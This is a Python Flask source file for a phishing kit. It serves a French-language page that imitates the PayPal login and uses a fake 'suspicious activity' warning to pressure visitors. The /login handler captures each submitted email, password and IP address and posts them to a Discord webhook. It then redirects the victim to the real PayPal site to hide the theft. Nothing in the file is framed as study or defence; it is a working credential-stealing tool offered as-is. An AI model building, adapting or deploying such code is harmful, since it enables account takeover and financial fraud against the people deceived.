import os
from flask import Flask, request, render_template_string, redirect
import requests
import datetime

app = Flask(__name__)
DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')

PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#e9eef2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{width:100%;max-width:400px;background:white;border-radius:12px;padding:32px 28px 24px;box-shadow:0 4px 16px rgba(0,0,0,0.06)}
.logo{text-align:center;margin-bottom:24px}
.logo img{height:45px;width:auto}
.title{font-size:20px;font-weight:500;color:#1a1a1a;text-align:center}
.subtitle{font-size:13px;color:#737373;text-align:center;margin-bottom:22px}
.alert{background:#fff8e1;border-left:4px solid #ffcc02;border-radius:4px;padding:10px 14px;margin-bottom:20px}
.alert-content strong{font-size:13px;color:#1a1a1a}
.alert-content p{font-size:12px;color:#5a4a1a}
.form-group{margin-bottom:16px}
.form-label{display:block;font-size:13px;font-weight:500;color:#1a1a1a;margin-bottom:4px}
.form-input{width:100%;padding:12px 14px;border:1px solid #d9d9d9;border-radius:6px;font-size:15px;outline:none}
.form-input:focus{border-color:#0070ba;box-shadow:0 0 0 3px rgba(0,112,186,0.12)}
.btn{width:100%;padding:14px;background:#0070ba;color:white;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer}
.btn:hover{background:#005ea6}
.links{display:flex;justify-content:space-between;margin-top:16px;font-size:13px}
.links a{color:#0070ba;text-decoration:none}
.divider{display:flex;align-items:center;margin:20px 0 18px}
.divider-line{flex:1;height:1px;background:#e6e6e6}
.divider-text{padding:0 14px;font-size:12px;color:#737373}
.btn-secondary{display:block;text-align:center;padding:12px;border:1px solid #0070ba;border-radius:30px;color:#0070ba;text-decoration:none;font-weight:500}
.btn-secondary:hover{background:#e6f2fa}
.secure{text-align:center;margin-top:20px;font-size:12px;color:#737373}
.footer{margin-top:24px;text-align:center;font-size:11px;color:#737373}
.footer a{color:#737373;text-decoration:none;margin:0 5px}
</style>
</head>
<body>
<div class=container>
<div class=logo><img src=https://www.paypalobjects.com/webstatic/icon/pp256.png alt=PayPal></div>
<h1 class=title>Connexion</h1>
<p class=subtitle>Accédez à votre compte PayPal</p>
<div class=alert><div class=alert-content><strong>⚠️ Activité suspecte</strong><p>Un paiement non autorisé a été bloqué. Vérifiez votre identité.</p></div></div>
<form method=POST action=/login>
<div class=form-group><label class=form-label>Email</label><input type=email name=email class=form-input placeholder=exemple@email.com required></div>
<div class=form-group><label class=form-label>Mot de passe</label><input type=password name=password class=form-input placeholder=•••••••• required></div>
<button type=submit class=btn>Se connecter</button>
<div class=links><a href=#>Mot de passe oublié ?</a><a href=#>Créer un compte</a></div>
<div class=divider><span class=divider-line></span><span class=divider-text>ou</span><span class=divider-line></span></div>
<a href=https://www.paypal.com class=btn-secondary>Continuer sur PayPal</a>
<div class=secure>🔒 Connexion sécurisée</div>
</form>
<div class=footer><a href=#>Conditions</a>·<a href=#>Confidentialité</a>·<a href=#>Aide</a>·<a href=#>Contact</a></div>
</div>
</body>
</html>
"""

@app.route('/')
def home():
    return PAGE

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    if DISCORD_WEBHOOK:
        payload = {
            'content': '🔐 **NOUVEAUX IDENTIFIANTS**',
            'embeds': [{
                'title': 'PayPal',
                'color': 0x0070ba,
                'fields': [
                    {'name': 'Email', 'value': email},
                    {'name': 'Mot de passe', 'value': password},
                    {'name': 'IP', 'value': request.remote_addr}
                ],
                'footer': {'text': datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
            }]
        }
        try:
            requests.post(DISCORD_WEBHOOK, json=payload)
        except:
            pass
    return redirect('https://www.paypal.com')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
